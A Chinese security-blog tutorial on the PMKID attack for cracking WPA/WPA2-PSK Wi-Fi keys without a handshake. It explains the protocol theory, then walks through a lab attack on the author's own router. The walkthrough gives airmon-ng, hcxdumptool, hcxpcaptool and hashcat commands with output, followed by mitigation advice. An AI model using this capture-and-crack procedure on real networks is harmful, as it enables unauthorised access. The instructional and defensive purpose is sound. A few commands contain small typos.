---
title: PMKID攻击 无需握手包破解WPA/WPA2 PSK
url: https://mp.weixin.qq.com/s?__biz=MzkwMTE4NDM5NA==&mid=2247486120&idx=2&sn=485686c2f7cbf2487975dbe3dcd17f35&chksm=c0b9e44df7ce6d5bf488334eaf4f89bb54e8fe29c33b6e1be8f08e4bf70cc0f22fcc7964aac0&scene=58&subscene=0#rd
source: 无害实验室sec
date: 2022-10-20
fetch_date: 2025-10-03T20:23:38.324900
---

# PMKID攻击 无需握手包破解WPA/WPA2 PSK

![cover_image](https://mmbiz.qlogo.cn/mmbiz_jpg/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUwpfKfZlaqI9IYKtyotaibZ6puX0dRubwSsdxkxqHfdjh6HKjlic9GI2g/0?wx_fmt=jpeg)

# PMKID攻击 无需握手包破解WPA/WPA2 PSK

颖奇L'Amore

渗透测试网络安全

# 0x01 前言▸

2018年8月4日，在hashcat论坛上一位安全研究员发了一个帖子，声称他在研究WPA3的安全性时无意中发现了一种全新的预共享密钥攻击方式，通过使用PMKID（Pairwise Master Key Identifier，成对主密钥标识符）破解WPA/WPA2的预共享密钥，轰动了全球。这种“无客户端攻击”方法的出现，标志着暴力破解不再需要有活跃客户端的参与，但应用的条件有限，受影响范围较低。

---

# 0x02 攻击原理▸

## 1.介绍▸

在本系列文章的第二篇介绍了WPA2-PSK破解的原理，其必要条件是需要有EAPoL四次握手的报文，进而通过比较MIC值判断密钥是否正确。但是本文要介绍的这种方法的最大区别就在于它并不需要EAPoL四次握手包即可进行PSK的暴力破解。通过PMKID进行无客户端暴力破解PSK的攻击方式并没有造成特别大的影响，因为它利用了RSN IE (Robust Security Network Information Element)，漏洞的发现者称它适用于所有支持漫游功能的802.11i/p/q/r网络，这些特征在较高级的路由器上得到支持。360安全研究院高级安全研究员兼产品经理、天马安全团队核心成员杨芸菲(qingxp9)统计了家庭网络和写字楼中受此漏洞威胁的Wi-Fi网络实际上不足3%。这种方式之所以被称为“无客户端”攻击，是因为它是攻击者直接和AP对话的。

## 2.RSN▸

RSN IE是强健安全网络信息元素的简称，RSN要求必须使用AES加密以加强安全性，是一个802.11i的安全标准。其实，在2004年IEEE 802.11i修订完成后，WiFi联盟推出了沿用至今的WPA2，WPA2的加密由TKIP更新为AES正是因为RSN的要求。为了增强安全性，IEEE 802.11i为RSN提供了两个重要的协议：四次握手和主密钥握手，WPA/WPA2中的四次握手就源于此，因为它们都是基于802.11i的，顺便一提，WPA实际上是802.11i的一个草案标准，在802.11i修订成功后WiFi联盟便正式对其进行了升级并正式推出WPA2，所以WPA也使用四次握手也就不足为奇了。RSN IE最大为255字节，报文结构如下：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcURk4NpFs9gAsTYmj0N8FtQib9bXEdUSRTanYacT0qQj4UpMGicMpYOOvw/640?wx_fmt=png)

RSN IE是802.11管理帧中的一个可变长度的可选字段，存在于在这些类型的帧中：

* Beacon frames.(send by AP)
* Probe Response frames.(send by AP)
* Association Request frames.(send by Client)
* Reassociation Request frames (Send by client)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUgX1ytH2FHJ3uw0E45iaokHlyshwpjtFLMoo2HumDicWwSuwNmmKmnc3Q/640?wx_fmt=png)

如果想通过wireshark抓包，可以通过这个过滤器来抓取这4种管理帧：

wlan.fc.type == 0 && (wlan.fc.type\_subtype == 0x00 wlan.fc.type\_subtype == 0x00 wlan.fc.type\_subtype == 0x05 wlan.fc.type\_subtype == 0x08)

## 3.PMKID▸

PMKID存在于RSN Information中的RSN Capabilies字段内。该漏洞发现者在hashcat论坛原文中贴出了PMKID的wireshark报文截图：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUbbRG1ZxUjqicAJLdicxZvuDocag8gEdIXILcUJXuw1rjeshXU3c3qSTg/640?wx_fmt=png)

PMKID是通过PMK等进行哈希得到的一个哈希值，其计算公式为：

PMKID = HMAC-SHA1-128(PMK, “PMK Name” MAC\_AP MAC\_STA)

让我们再次回顾EAPoL四次握手：在完成链路关联后开始四次握手，可以看到，第一个携带着EAPoL Key的消息是由AP发出的：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUmyr6IY5mRoxnI4ZbibzFYHzgicHjpPZbnXvypiaKXPjfSNm6jO8AYQzWg/640?wx_fmt=png)

因此，攻击者可以与AP开始四次握手，在四次握手的Message 1中得到所需要的数据，之后进行哈希爆破，并不需要其他客户端的参与。

## 4.IEEE 802.11r▸

该攻击方法的提出者称这种方法应用于支持漫游的WPA/WPA2-PSK认证的Wi-Fi网络。所谓漫游是一种支持从一个基站快速“无缝”切换到另一个基站的技术。举个例子，假设坐在高铁上打了10分钟的电话，高铁的速度是300km/h，那么这10分钟高铁行走了50公里，一个4G的基站的信号覆盖范围只有几百米，对于50公里肯定切换了很多个基站，但排除信号不好的情况下电话并没有发生卡顿，通话者也毫无感觉，这就是漫游。更多相关知识请参考CCIE Wireless或CWSP认证相关文档。

# 0x03 攻击实现▸

**环境介绍：**

* PSK：wWw.Gem-Love.Com
* 认证：WPA2-PSK
* 客户端：无
* 路由器型号：Cisco CVR100W SmallBusiness VPN Router
* 攻击者：Kali Linux 2019.4

## 1.工具安装▸

本攻击需要hcxtools/hcxdumptol/hashcat这三个工具

### ① 安装hcxtools▸

b

```
git clone https://github.con/ZerBea/hcxtools.git
make
make install
```

② 安装hcxdumptool

```
git clone https://github.com/ZerBea/hcxdumptool.git
make
make install
```

paintext

③ 安装hashcat▸

### hashcat在kali linux下自带了。安装方式：▸

pla

```
git clone https://github.com/hashcat/hashcat.git
make
make install
```

intext

## 2.捕获PMKID▸

首先用airmon-ng将网卡置于Monitor Mode

```
airmon-ng start wlan0
```

使用hcxdumptool破获PMKID

```
hcxdumptool -o /root/y1ng.pcapng -i wlan0mon --enable\_status=1
```

在最下面可以看到这样的消息，表示获取PMKID成功：

```
16:52:59 4 b0febdd69882 <-> 10bd18082864 PMKID:b418e4f858c1b0c37662a8d5042014f2 (Cisco\_GEM-LOVE.COM)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUIcib0pD6uBIK5pFkriaUfSjzBnA4t0GYsRlVibF41l8ia5yLEocqxLIfcA/640?wx_fmt=png)

获取到目标的PMKID就可以暂停了

## 3.格式转换▸

这一步 目的是将刚刚的pccap包转换成hashcat可用的格式，使用hcxpcaptool：

hcxpcaptool -z y1ng.16800 y1ng.pcapng

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUfXuCwwwicMXWPBiaRGO9myynv5ksgZXCnmkv7a80gHD1EVcSPujpslUw/640?wx_fmt=png)

这个16800可以通过`hashcat --help`查看帮助看到对应的hash类型：

16800 WPA-PMKID-PBKDF2 Network Protocols

导出的16800格式的文件会每个PMKID占一行，打开是这样的：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcU8zTQyK7hlQNbZnxJ8bfSkyeu0iavF36W6icvn8amr8PfE6Xwc5Qpv0iag/640?wx_fmt=png)

用3个星号将它们分成4个部分，分别表示：

* PMKID
* MAC AP
* MAC Station
* ESSID

## 4.暴力破解▸

之后就可以使用hashcat进行破解了，我使用了一个包含100个密码的字典来演示，其中有我的正确的密码：

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcU51avPtfUn6o8W0D6otXAN6Xx78uE7RIkFrj66ZECAf9NBU9VP2YReA/640?wx_fmt=png)

命令：

hashcat -m 16800 y1ng.16800 -a 0 -w 3 pass.txt –force

相关参数的解释：

```
\-w, --workload-profile  Num  Enable a specific workload profile, see pool below  -w 3

- \[ Workload Profiles \] -

#  Performance  Runtime  Power Consumption  Desktop Impact

===+=============+=========+===================+=================
1  Low  2 ms  Low  Minimal
2  Default  12 ms  Economic  Noticeable
3  High  96 ms  High  Unresponsive
4  Nightmare  480 ms  Insane  Headless

\-a, --attack-mode  Num  Attack-mode, see references below  -a 3

- \[ Attack Modes \] -

#  Mode

===+======
0  Straight
1  Combination
3  Brute-force
6  Hybrid Wordlist + Mask
7  Hybrid Mask + Wordlist
```

--force是可选参数，用来忽略一些warning，如果报warning的话就加上 爆破成功则会得到预共享密钥了

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM5pkW4icwJn1mTuZdUTqVPcUjBibbdutA2EibPNLu6jicxmpYF5znkjumXRRZdJx7lsb7k23CAoaFoZmw/640?wx_fmt=png)

# 0x04 安全建议▸

* 无客户端攻击扔是离线暴力破解攻击，需要用户增强PSK密钥强度
* 若无需要且条件允许则关闭Roaming
* 及时更新路由器固件，摒弃不良Wi-Fi上网习惯，不用“万能钥匙”，不连接公共Wi-Fi

|  |
| --- |
| **声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。 |

作者：颖奇L'Amore

原文地址：https://www.gem-love.com/

**关 注 有 礼**

关注本公众号回复“718619”

可以免费领取全套网络安全学习教程，安全靶场、面试指南、安全沙龙PPT、代码安全、火眼安全系统等

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片关注学习吧！

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

渗透测试网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过